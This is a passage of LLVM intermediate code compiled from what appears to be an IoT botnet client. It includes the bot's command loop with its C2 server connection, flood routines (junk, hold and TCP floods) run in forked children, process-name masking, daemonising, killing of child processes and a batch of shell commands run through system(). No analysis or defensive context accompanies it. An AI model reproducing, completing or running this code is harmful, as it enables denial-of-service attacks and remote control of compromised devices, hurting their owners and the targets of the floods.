  %246 = getelementptr inbounds i8*, i8** %1, i64 1
  %247 = load i8*, i8** %246, align 8
  %strchr168 = tail call i8* @strchr(i8* %247, i32 44)
  %248 = icmp eq i8* %strchr168, null
  br i1 %248, label %257, label %.preheader177.preheader

.preheader177.preheader:                          ; preds = %245
  br label %.preheader177

.preheader177:                                    ; preds = %.preheader177.preheader, %251
  %.sink173 = phi i8* [ null, %251 ], [ %247, %.preheader177.preheader ]
  %249 = tail call i8* @strtok(i8* %.sink173, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %250 = icmp eq i8* %249, null
  br i1 %250, label %.loopexit178.loopexit, label %251

; <label>:251:                                    ; preds = %.preheader177
  %252 = tail call i32 @listFork()
  %253 = icmp eq i32 %252, 0
  br i1 %253, label %254, label %.preheader177

; <label>:254:                                    ; preds = %251
  tail call void @sendJUNK(i8* nonnull %249, i32 %238, i32 %243)
  tail call void @sendHOLD(i8* nonnull %249, i32 %238, i32 %243)
  %255 = load i32, i32* @mainCommSock, align 4
  %256 = tail call i32 @close(i32 %255) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:257:                                    ; preds = %245
  %258 = tail call i32 @listFork()
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %354

; <label>:260:                                    ; preds = %257
  tail call void @sendJUNK(i8* %247, i32 %238, i32 %243)
  tail call void @sendHOLD(i8* %247, i32 %238, i32 %243)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit178.loopexit:                            ; preds = %.preheader177
  br label %.loopexit178

.loopexit178:                                     ; preds = %.loopexit178.loopexit, %.loopexit180
  %261 = load i8*, i8** %1, align 8
  %262 = tail call i32 @strcmp(i8* %261, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #15
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %.loopexit176

; <label>:264:                                    ; preds = %.loopexit178
  %265 = icmp slt i32 %0, 6
  br i1 %265, label %354, label %266

; <label>:266:                                    ; preds = %264
  %267 = getelementptr inbounds i8*, i8** %1, i64 3
  %268 = load i8*, i8** %267, align 8
  %269 = tail call i32 @atoi(i8* %268) #15
  %270 = icmp eq i32 %269, -1
  br i1 %270, label %354, label %271

; <label>:271:                                    ; preds = %266
  %272 = getelementptr inbounds i8*, i8** %1, i64 2
  %273 = load i8*, i8** %272, align 8
  %274 = tail call i32 @atoi(i8* %273) #15
  %275 = icmp eq i32 %274, -1
  br i1 %275, label %354, label %276

; <label>:276:                                    ; preds = %271
  %277 = getelementptr inbounds i8*, i8** %1, i64 5
  %278 = load i8*, i8** %277, align 8
  %279 = tail call i32 @atoi(i8* %278) #15
  %280 = icmp slt i32 %279, 0
  br i1 %280, label %354, label %281

; <label>:281:                                    ; preds = %276
  %282 = icmp eq i32 %0, 7
  br i1 %282, label %283, label %288

; <label>:283:                                    ; preds = %281
  %284 = getelementptr inbounds i8*, i8** %1, i64 6
  %285 = load i8*, i8** %284, align 8
  %286 = tail call i32 @atoi(i8* %285) #15
  %287 = icmp slt i32 %286, 1
  br i1 %287, label %354, label %288

; <label>:288:                                    ; preds = %283, %281
  %289 = getelementptr inbounds i8*, i8** %1, i64 1
  %290 = load i8*, i8** %289, align 8
  %291 = load i8*, i8** %272, align 8
  %292 = tail call i32 @atoi(i8* %291) #15
  %293 = load i8*, i8** %267, align 8
  %294 = tail call i32 @atoi(i8* %293) #15
  %295 = getelementptr inbounds i8*, i8** %1, i64 4
  %296 = load i8*, i8** %295, align 8
  br i1 %282, label %297, label %301

; <label>:297:                                    ; preds = %288
  %298 = getelementptr inbounds i8*, i8** %1, i64 6
  %299 = load i8*, i8** %298, align 8
  %300 = tail call i32 @atoi(i8* %299) #15
  br label %301

; <label>:301:                                    ; preds = %288, %297
  %302 = phi i32 [ %300, %297 ], [ 10, %288 ]
  %303 = getelementptr inbounds i8*, i8** %1, i64 5
  %304 = load i8*, i8** %303, align 8
  %305 = tail call i32 @atoi(i8* %304) #15
  %strchr169 = tail call i8* @strchr(i8* %290, i32 44)
  %306 = icmp eq i8* %strchr169, null
  br i1 %306, label %313, label %.preheader175.preheader

.preheader175.preheader:                          ; preds = %301
  br label %.preheader175

.preheader175:                                    ; preds = %.preheader175.preheader, %309
  %.sink174 = phi i8* [ null, %309 ], [ %290, %.preheader175.preheader ]
  %307 = tail call i8* @strtok(i8* %.sink174, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %308 = icmp eq i8* %307, null
  br i1 %308, label %.loopexit176.loopexit, label %309

; <label>:309:                                    ; preds = %.preheader175
  %310 = tail call i32 @listFork()
  %311 = icmp eq i32 %310, 0
  br i1 %311, label %312, label %.preheader175

; <label>:312:                                    ; preds = %309
  tail call void @sendTCP(i8* nonnull %307, i32 %292, i32 %294, i8* %296, i32 %305, i32 %302, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:313:                                    ; preds = %301
  %314 = tail call i32 @listFork()
  %315 = icmp eq i32 %314, 0
  br i1 %315, label %316, label %354

; <label>:316:                                    ; preds = %313
  tail call void @sendTCP(i8* %290, i32 %292, i32 %294, i8* %296, i32 %305, i32 %302, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit176.loopexit:                            ; preds = %.preheader175
  br label %.loopexit176

.loopexit176:                                     ; preds = %.loopexit176.loopexit, %.loopexit178
  %317 = load i8*, i8** %1, align 8
  %318 = tail call i32 @strcmp(i8* %317, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.106, i64 0, i64 0)) #15
  %319 = icmp eq i32 %318, 0
  %320 = load i64, i64* @numpids, align 8
  %321 = icmp ne i64 %320, 0
  %or.cond196 = and i1 %319, %321
  br i1 %or.cond196, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit176
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %334
  %.0194 = phi i64 [ %335, %334 ], [ 0, %.lr.ph.preheader ]
  %322 = load i32*, i32** @pids, align 8
  %323 = getelementptr inbounds i32, i32* %322, i64 %.0194
  %324 = load i32, i32* %323, align 4
  %325 = icmp eq i32 %324, 0
  br i1 %325, label %334, label %326

; <label>:326:                                    ; preds = %.lr.ph
  %327 = tail call i32 @getpid() #3
  %328 = icmp eq i32 %324, %327
  br i1 %328, label %334, label %329

; <label>:329:                                    ; preds = %326
  %330 = load i32*, i32** @pids, align 8
  %331 = getelementptr inbounds i32, i32* %330, i64 %.0194
  %332 = load i32, i32* %331, align 4
  %333 = tail call i32 @kill(i32 %332, i32 9) #3
  br label %334

; <label>:334:                                    ; preds = %326, %.lr.ph, %329
  %335 = add i64 %.0194, 1
  %336 = load i64, i64* @numpids, align 8
  %337 = icmp ult i64 %335, %336
  br i1 %337, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %334
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit176
  %338 = load i8*, i8** %1, align 8
  %339 = tail call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.107, i64 0, i64 0)) #15
  %340 = icmp eq i32 %339, 0
  br i1 %340, label %341, label %342

; <label>:341:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #17
  unreachable

; <label>:342:                                    ; preds = %.loopexit
  %343 = tail call i32 @strcmp(i8* %338, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.108, i64 0, i64 0)) #15
  %344 = icmp eq i32 %343, 0
  br i1 %344, label %345, label %354

; <label>:345:                                    ; preds = %342
  %346 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i64 0, i64 0)) #3
  %347 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i64 0, i64 0)) #3
  %348 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i64 0, i64 0)) #3
  %349 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i64 0, i64 0)) #3
  %350 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i64 0, i64 0)) #3
  %351 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i64 0, i64 0)) #3
  %352 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i64 0, i64 0)) #3
  %353 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i64 0, i64 0)) #3
  br label %354

; <label>:354:                                    ; preds = %342, %313, %257, %226, %181, %162, %108, %77, %41, %264, %266, %271, %276, %283, %233, %235, %240, %202, %204, %209, %169, %171, %176, %115, %117, %122, %127, %135, %84, %86, %91, %55, %57, %62, %30, %345, %47, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0))
  %8 = load i8*, i8** %1, align 8
  %9 = tail call i64 @strlen(i8* %8) #15
  tail call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 %9, i32 1, i1 false)
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i64 0, i64 0), i8** %1, align 8
  %10 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([19 x i8]* @.str.121 to i64), i32 0, i32 0, i32 0) #3
  %11 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %12 = tail call i32 @getpid() #3
  %13 = xor i32 %12, %11
  tail call void @srand(i32 %13) #3
  %14 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %15 = tail call i32 @getpid() #3
  %16 = xor i32 %15, %14
  tail call void @init_rand(i32 %16)
  %17 = tail call i32 @getOurIP()
  %18 = tail call i32 @fork() #3
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %22, label %20

; <label>:20:                                     ; preds = %2
  %21 = call i32 @waitpid(i32 %18, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:22:                                     ; preds = %2
  %23 = tail call i32 @fork() #3
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %26, label %25

; <label>:25:                                     ; preds = %22
  tail call void @exit(i32 0) #17
  unreachable

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @setsid() #3
  %28 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0)) #3
  %29 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %31 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %32 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge83

.backedge83.loopexit:                             ; preds = %.backedge
  br label %.backedge83.backedge

.backedge83:                                      ; preds = %.backedge83.backedge, %26
  %33 = call i32 @initConnection()
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %37, label %35

; <label>:35:                                     ; preds = %.backedge83
  %36 = call i32 @sleep(i32 5) #3
  br label %.backedge83.backedge

; <label>:37:                                     ; preds = %.backedge83
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %38, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0))
  %40 = load i32, i32* @mainCommSock, align 4
  %41 = call i32 @recvLine(i32 %40, i8* nonnull %30, i32 4096)
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %.backedge83.backedge, label %.preheader81.preheader

.backedge83.backedge:                             ; preds = %37, %35, %.backedge83.loopexit
  br label %.backedge83

.preheader81.preheader:                           ; preds = %37
  br label %.preheader81

.preheader81:                                     ; preds = %.preheader81.preheader, %.backedge
  %43 = phi i32 [ %98, %.backedge ], [ %41, %.preheader81.preheader ]
  %44 = load i64, i64* @numpids, align 8
  %45 = icmp eq i64 %44, 0
  br i1 %45, label %._crit_edge100, label %.lr.ph99.preheader

.lr.ph99.preheader:                               ; preds = %.preheader81
  br label %.lr.ph99

.lr.ph99:                                         ; preds = %.lr.ph99.preheader, %88
  %indvars.iv = phi i64 [ %indvars.iv.next, %88 ], [ 0, %.lr.ph99.preheader ]
  %46 = load i32*, i32** @pids, align 8
  %47 = getelementptr inbounds i32, i32* %46, i64 %indvars.iv
  %48 = load i32, i32* %47, align 4
  %49 = call i32 @waitpid(i32 %48, i32* null, i32 1) #3
  %50 = icmp sgt i32 %49, 0
  br i1 %50, label %.preheader, label %88

.preheader:                                       ; preds = %.lr.ph99
  %51 = add nuw i64 %indvars.iv, 1
  %52 = load i64, i64* @numpids, align 8
  %53 = icmp ult i64 %51, %52
  %54 = load i32*, i32** @pids, align 8
  %55 = trunc i64 %indvars.iv to i32
  br i1 %53, label %.lr.ph90.preheader, label %._crit_edge91

.lr.ph90.preheader:                               ; preds = %.preheader
  %56 = trunc i64 %51 to i32
  %57 = trunc i64 %indvars.iv to i32
  br label %.lr.ph90

.lr.ph90:                                         ; preds = %.lr.ph90.preheader, %.lr.ph90
  %58 = phi i32* [ %67, %.lr.ph90 ], [ %54, %.lr.ph90.preheader ]
  %59 = phi i64 [ %64, %.lr.ph90 ], [ %51, %.lr.ph90.preheader ]
  %.07089 = phi i32 [ %.070, %.lr.ph90 ], [ %56, %.lr.ph90.preheader ]
  %.070.in88 = phi i32 [ %.07089, %.lr.ph90 ], [ %57, %.lr.ph90.preheader ]
  %60 = getelementptr inbounds i32, i32* %58, i64 %59
  %61 = load i32, i32* %60, align 4
  %62 = zext i32 %.070.in88 to i64
  %63 = getelementptr inbounds i32, i32* %58, i64 %62
  store i32 %61, i32* %63, align 4
  %.070 = add i32 %.07089, 1
  %64 = zext i32 %.070 to i64
  %65 = load i64, i64* @numpids, align 8
  %66 = icmp ult i64 %64, %65
  %67 = load i32*, i32** @pids, align 8
  br i1 %66, label %.lr.ph90, label %._crit_edge91.loopexit

._crit_edge91.loopexit:                           ; preds = %.lr.ph90
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %._crit_edge91.loopexit, %.preheader
  %.070.in.lcssa = phi i32 [ %55, %.preheader ], [ %.07089, %._crit_edge91.loopexit ]
  %.lcssa = phi i32* [ %54, %.preheader ], [ %67, %._crit_edge91.loopexit ]
  %68 = zext i32 %.070.in.lcssa to i64
  %69 = getelementptr inbounds i32, i32* %.lcssa, i64 %68
  store i32 0, i32* %69, align 4
  %70 = load i64, i64* @numpids, align 8
  %71 = add i64 %70, -1
  store i64 %71, i64* @numpids, align 8
  %72 = shl i64 %70, 2
  %73 = call noalias i8* @malloc(i64 %72) #3
  %74 = bitcast i8* %73 to i32*
  %75 = icmp eq i64 %71, 0
  %76 = load i32*, i32** @pids, align 8
  br i1 %75, label %._crit_edge96, label %.lr.ph95.preheader

.lr.ph95.preheader:                               ; preds = %._crit_edge91
  br label %.lr.ph95

.lr.ph95:                                         ; preds = %.lr.ph95.preheader, %.lr.ph95
  %77 = phi i32* [ %86, %.lr.ph95 ], [ %76, %.lr.ph95.preheader ]
  %78 = phi i64 [ %83, %.lr.ph95 ], [ 0, %.lr.ph95.preheader ]
  %.17193 = phi i32 [ %82, %.lr.ph95 ], [ 0, %.lr.ph95.preheader ]
  %79 = getelementptr inbounds i32, i32* %77, i64 %78
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i32, i32* %74, i64 %78
  store i32 %80, i32* %81, align 4
  %82 = add i32 %.17193, 1
  %83 = zext i32 %82 to i64
  %84 = load i64, i64* @numpids, align 8
  %85 = icmp ult i64 %83, %84
  %86 = load i32*, i32** @pids, align 8
  br i1 %85, label %.lr.ph95, label %._crit_edge96.loopexit

._crit_edge96.loopexit:                           ; preds = %.lr.ph95
  br label %._crit_edge96

._crit_edge96:                                    ; preds = %._crit_edge96.loopexit, %._crit_edge91
  %.lcssa84 = phi i32* [ %76, %._crit_edge91 ], [ %86, %._crit_edge96.loopexit ]
  %87 = bitcast i32* %.lcssa84 to i8*
  call void @free(i8* %87) #3
  store i8* %73, i8** bitcast (i32** @pids to i8**), align 8
  br label %88

; <label>:88:                                     ; preds = %.lr.ph99, %._crit_edge96
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %89 = ashr exact i64 %sext, 32
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  br i1 %91, label %.lr.ph99, label %._crit_edge100.loopexit

._crit_edge100.loopexit:                          ; preds = %88
  br label %._crit_edge100

._crit_edge100:                                   ; preds = %._crit_edge100.loopexit, %.preheader81
  %92 = sext i32 %43 to i64
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %92
  store i8 0, i8* %93, align 1
  call void @trim(i8* nonnull %30)
  %strncmp = call i32 @strncmp(i8* nonnull %30, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0), i64 4)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %94, label %100

; <label>:94:                                     ; preds = %._crit_edge100
  %95 = load i32, i32* @mainCommSock, align 4
  %96 = call i32 (i32, i8*, ...) @sockprintf(i32 %95, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i64 0, i64 0))
  br label %.backedge

.backedge.loopexit:                               ; preds = %.lr.ph112
  br label %.backedge

.backedge.loopexit132:                            ; preds = %.preheader113
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit132, %.backedge.loopexit, %._crit_edge109.thread, %94, %._crit_edge109, %102, %134
  %97 = load i32, i32* @mainCommSock, align 4
  %98 = call i32 @recvLine(i32 %97, i8* nonnull %30, i32 4096)
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %.backedge83.loopexit, label %.preheader81

; <label>:100:                                    ; preds = %._crit_edge100
  %strncmp73 = call i32 @strncmp(i8* nonnull %30, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.127, i64 0, i64 0), i64 5)
  %cmp74 = icmp eq i32 %strncmp73, 0
  br i1 %cmp74, label %101, label %102

; <label>:101:                                    ; preds = %100
  call void @exit(i32 0) #17
  unreachable

; <label>:102:                                    ; preds = %100
  %103 = load i8, i8* %30, align 16
  %104 = icmp eq i8 %103, 33
  br i1 %104, label %.preheader113.preheader, label %.backedge

.preheader113.preheader:                          ; preds = %102
  br label %.preheader113

.preheader113:                                    ; preds = %.preheader113.preheader, %106
  %.068 = phi i8* [ %107, %106 ], [ %31, %.preheader113.preheader ]
  %105 = load i8, i8* %.068, align 1
  switch i8 %105, label %106 [
    i8 0, label %.backedge.loopexit132
    i8 32, label %108
  ]

; <label>:106:                                    ; preds = %.preheader113
  %107 = getelementptr inbounds i8, i8* %.068, i64 1
  br label %.preheader113

; <label>:108:                                    ; preds = %.preheader113
  store i8 0, i8* %.068, align 1
  %109 = call i64 @strlen(i8* %31) #15
  %110 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 %109
  %111 = getelementptr inbounds i8, i8* %110, i64 2
  br label %112

; <label>:112:                                    ; preds = %117, %108
  %113 = call i64 @strlen(i8* %111) #15
  %114 = add i64 %113, -1
  %115 = getelementptr inbounds i8, i8* %111, i64 %114
  %116 = load i8, i8* %115, align 1
  switch i8 %116, label %.preheader79.preheader [
    i8 13, label %117
    i8 10, label %117
  ]

.preheader79.preheader:                           ; preds = %112
  br label %.preheader79

; <label>:117:                                    ; preds = %112, %112
  store i8 0, i8* %115, align 1
  br label %112

.preheader79:                                     ; preds = %.preheader79.preheader, %119
  %.069 = phi i8* [ %120, %119 ], [ %111, %.preheader79.preheader ]
  %118 = load i8, i8* %.069, align 1
  switch i8 %118, label %119 [
    i8 32, label %121
    i8 0, label %121
  ]

; <label>:119:                                    ; preds = %.preheader79
  %120 = getelementptr inbounds i8, i8* %.069, i64 1
  br label %.preheader79

; <label>:121:                                    ; preds = %.preheader79, %.preheader79
  store i8 0, i8* %.069, align 1
  %122 = getelementptr inbounds i8, i8* %.069, i64 1
  %123 = load i8, i8* %111, align 1
  %124 = icmp eq i8 %123, 0
  br i1 %124, label %._crit_edge104, label %.lr.ph103.preheader

.lr.ph103.preheader:                              ; preds = %121
  br label %.lr.ph103

.lr.ph103:                                        ; preds = %.lr.ph103.preheader, %.lr.ph103
  %125 = phi i8 [ %130, %.lr.ph103 ], [ %123, %.lr.ph103.preheader ]
  %.066101 = phi i8* [ %129, %.lr.ph103 ], [ %111, %.lr.ph103.preheader ]
  %126 = zext i8 %125 to i32
  %127 = call i32 @toupper(i32 %126) #15
  %128 = trunc i32 %127 to i8
  store i8 %128, i8* %.066101, align 1
  %129 = getelementptr inbounds i8, i8* %.066101, i64 1
  %130 = load i8, i8* %129, align 1
  %131 = icmp eq i8 %130, 0
  br i1 %131, label %._crit_edge104.loopexit, label %.lr.ph103

._crit_edge104.loopexit:                          ; preds = %.lr.ph103
  br label %._crit_edge104

._crit_edge104:                                   ; preds = %._crit_edge104.loopexit, %121
  %132 = call i32 @strcmp(i8* %111, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i64 0, i64 0)) #15
  %133 = icmp eq i32 %132, 0
  br i1 %133, label %134, label %147

; <label>:134:                                    ; preds = %._crit_edge104
  %135 = call i32 @listFork()
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %137, label %.backedge

; <label>:137:                                    ; preds = %134
  %138 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %138, i8 0, i64 1024, i32 16, i1 false)
